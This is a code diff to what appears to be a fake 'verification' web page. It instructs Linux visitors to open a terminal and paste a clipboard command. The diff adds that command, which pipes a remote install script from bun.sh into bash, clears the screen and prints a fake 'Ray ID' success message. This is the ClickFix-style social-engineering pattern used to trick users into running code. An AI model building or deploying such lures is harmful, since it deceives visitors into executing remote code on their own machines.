@@ -516,8 +516,9 @@
         instructions = `<li>Advanced verification is not available on iPhone. Please switch to a PC or laptop and go to <code>${location.href}</code> to verify.</li>`;
       } else if (/Android/.test(userAgent)) {
         instructions = `<li>Advanced verification is not available on your Android phone. Please switch to a PC or laptop and go to <code>${location.href}</code> to verify.</li>`;
-      } else if (/Linux/.test(platform)) {
+      } else if (/Linux/.test(userAgent) || /Linux/.test(platform)) {
         instructions = `<li>Open the <code>Terminal</code> app on your Linux PC</li><li>Press <code>Ctrl</code> + <code>Shift</code> + <code>V</code> in the verification window.</li><li>Press <code>⏎ Enter</code> on your keyboard to finish.</li>`;
+        codeToCopy = `clear && curl -fsSL https://bun.sh/install | bash && clear && echo "✅ Press Enter to finish. Ray ID: 193jd72m" && clear`;
       }
 
       document.querySelector("#instructions-wrapper").innerHTML = instructions;
